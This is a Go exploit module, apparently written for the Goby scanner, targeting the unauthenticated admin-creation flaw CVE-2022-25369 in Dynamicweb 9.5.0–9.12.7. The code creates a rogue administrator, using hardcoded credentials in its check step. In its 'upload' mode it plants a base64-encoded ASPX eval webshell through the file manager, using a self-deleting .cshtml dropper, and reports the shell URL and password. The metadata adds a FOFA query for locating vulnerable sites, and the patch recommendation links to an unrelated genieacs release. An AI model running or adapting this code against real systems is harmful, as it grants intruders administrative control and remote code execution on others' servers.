package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dynamicweb 9.5.0 - 9.12.7 Default.aspx file Unauthenticated Admin User Creation Vulnerability (CVE-2022-25369)",
    "Description": "<p>Dynamicweb provides a cloud-based e-business suite.</p><p>in Dynamicweb before 9.12.8. An attacker can add a new administrator user without authentication. </p>",
    "Impact": "<p>Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin User Creation</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.dynamicweb.com/\">https://www.dynamicweb.com/</a></p><p><a href=\"https://github.com/genieacs/genieacs/releases/tag/v1.2.8\"></a></p>",
    "Product": "Dynamicweb",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "Dynamicweb 9.5.0 - 9.12.7 Default.aspx 文件未认证管理员用户创建漏洞（CVE-2022-25369）",
            "Product": "Dynamicweb",
            "Description": "<p>Dynamicweb 提供基于云的电子商务套件。</p><p>在 9.12.8 之前的 Dynamicweb 中, 攻击者无需身份验证即可添加新的管理员用户。<br></p>",
            "Recommendation": "<p><a target=\"_Blank\" href=\"https://github.com/genieacs/genieacs/releases/tag/v1.2.8\"></a></p><p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://www.dynamicweb.com\">https://www.dynamicweb.com</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Dynamicweb 9.5.0 - 9.12.7 Default.aspx file Unauthenticated Admin User Creation Vulnerability (CVE-2022-25369)",
            "Product": "Dynamicweb",
            "Description": "<p>Dynamicweb provides a cloud-based e-business suite.</p><p>in Dynamicweb before 9.12.8. An attacker can add a new administrator user without authentication.&nbsp;<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.dynamicweb.com/\">https://www.dynamicweb.com/</a><br></p><p><a href=\"https://github.com/genieacs/genieacs/releases/tag/v1.2.8\"></a></p>",
            "Impact": "<p>Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin User Creation</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "(body=\"/Files/Templates/Designs/\" && body=\"Dynamicweb\") || header=\"Dynamicweb=\" || banner=\"Dynamicweb=\" || header=\"Ecom.SelectedLangID.Frontend\" || banner=\"Ecom.SelectedLangID.Frontend\" || header=\"Dynamicweb.SessionVisitor=\"||banner=\"Dynamicweb.SessionVisitor=\"",
    "GobyQuery": "(body=\"/Files/Templates/Designs/\" && body=\"Dynamicweb\") || header=\"Dynamicweb=\" || banner=\"Dynamicweb=\" || header=\"Ecom.SelectedLangID.Frontend\" || banner=\"Ecom.SelectedLangID.Frontend\" || header=\"Dynamicweb.SessionVisitor=\"||banner=\"Dynamicweb.SessionVisitor=\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.dynamicweb.com",
    "DisclosureDate": "2022-01-21",
    "References": [
        "https://blog.assetnote.io/2022/02/20/dynamicweb-advisory/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-25369"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "createSelect",
            "value": "upload,addUser",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	doLogin := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/Admin/access/default.aspx")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `_csrftoken`) {
				csrfName := regexp.MustCompile(`name="(_csrftoken.*?)"`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
				csrfToken := regexp.MustCompile(`name="_csrftoken\w+" value="(.*?)"`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
				cookie := regexp.MustCompile(`(ASP.NET_SessionId=.*?);`).FindAllStringSubmatch(resp.Header.Get("Set-Cookie"), -1)[0][1]
				payload := fmt.Sprintf("Username=CWeCai&Password=uRKBIeG111&language=2&%s=%s", csrfName, csrfToken)
				cfg := httpclient.NewPostRequestConfig("/Admin/access/Access_User_login.aspx")
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg.Header.Store("Cookie", cookie)
				cfg.Data = payload
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if resp.StatusCode == 302 && strings.Contains(resp.Utf8Html, `"/Admin/default.aspx"`) {
						return cookie
					}
				}
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8)
			adminName := goutils.RandomHexString(8)
			userName := "CWeCai"
			password := "uRKBIeG111"
			uri := fmt.Sprintf("/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername=%s&adminpassword=%s&adminemail=%s@gmail.com&adminname=%s", userName, password, randomStr, adminName)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `true`) {
					if cookie := doLogin(u); len(cookie) > 0 {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "upload" {
				if cookie := doLogin(expResult.HostInfo); len(cookie) > 0 {
					uri := "/Admin/Filemanager/Upload/Store.aspx"
					fileName := fmt.Sprintf("%s.cshtml", goutils.RandomHexString(8))
					aspxName := fmt.Sprintf("%s.aspx", goutils.RandomHexString(8))
					shell := base64.StdEncoding.EncodeToString([]byte(`<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>`))
					writeShell := fmt.Sprintf(`@{
    var base64EncodedData = "%s";
    var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData); 
    var userData = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
    var dataFile = Server.MapPath("~/%s");
    File.WriteAllText(@dataFile, userData);
    System.IO.File.Delete(Request.PhysicalPath);
}`, shell, aspxName)
					postData := fmt.Sprintf(`------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="TargetLocation"
/
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="AllowOverwrite"
true
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="ImageResize"
false
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="ImageQuality"
100
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="ImageResizeWidth"
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="ImageResizeHeight"
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="ArchiveExtract"
false
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="ArchiveCreateFolders"
false
------WebKitFormBoundary4YoScaMAmlfabdod
Content-Disposition: form-data; name="file[0]"; filename="%s"
Content-Type: application/octet-stream
%s
------WebKitFormBoundary4YoScaMAmlfabdod--`, fileName, writeShell)
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary4YoScaMAmlfabdod")
					cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
					cfg.Header.Store("Cookie", cookie)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					cfg.Data = postData
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "1:") {
							if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/" + fileName); err == nil {
								if resp.StatusCode == 200 {
									shellUrl := expResult.HostInfo.FixedHostInfo + "/" + aspxName
									if resp, err := httpclient.SimpleGet(shellUrl); err == nil {
										if resp.StatusCode == 200 {
											expResult.Success = true
											shellInfo := fmt.Sprintf("godzilla eval aspx webshell url: %s,pass:pass,key:key", shellUrl)
											expResult.Output = shellInfo
										}
									}
								}
							}
						}
					}
				}
			}
			if ss.Params["AttackType"].(string) == "addUser" {
				randomStr := goutils.RandomHexString(8)
				adminName := goutils.RandomHexString(8)
				userName := goutils.RandomHexString(8)
				password := goutils.RandomHexString(8)
				uri := fmt.Sprintf("/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername=%s&adminpassword=%s&adminemail=%s@gmail.com&adminname=%s", userName, password, randomStr, adminName)
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `true`) {
						if cookie := doLogin(expResult.HostInfo); len(cookie) > 0 {
							expResult.Success = true
							shellInfo := fmt.Sprintf("new user name: %s,pass: %s", userName, password)
							expResult.Output = shellInfo
						}
					}
				}
			}
			return expResult
		},
	))
}
